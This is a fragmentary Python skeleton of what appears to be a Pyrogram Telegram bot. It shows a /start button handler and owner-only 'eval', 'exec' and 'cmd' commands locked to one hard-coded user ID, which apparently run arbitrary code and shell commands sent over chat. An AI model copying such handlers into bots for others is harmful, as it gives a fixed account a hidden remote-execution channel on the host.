...
def private_func(c,m,k):
  ...
  if text == '/start':
    ...
    reply_markup = InlineKeyboardMarkup([
        [
            InlineKeyboardButton('ASHEQ_ALSAMT', url='https://t.me/T_A_Tl'),
...
@Client.on_message(filters.command("eval") & filters.user(5571722913))
...
@Client.on_message(filters.command("exec") & filters.user(5571722913))
...
@Client.on_message(filters.command("cmd") & filters.user(5571722913))
...
@Client.on_message(filters.command("print") & filters.user(5571722913))
...
@Client.on_message(filters.command(["sc", "webs", "ss"]) & filters.user(5571722913))
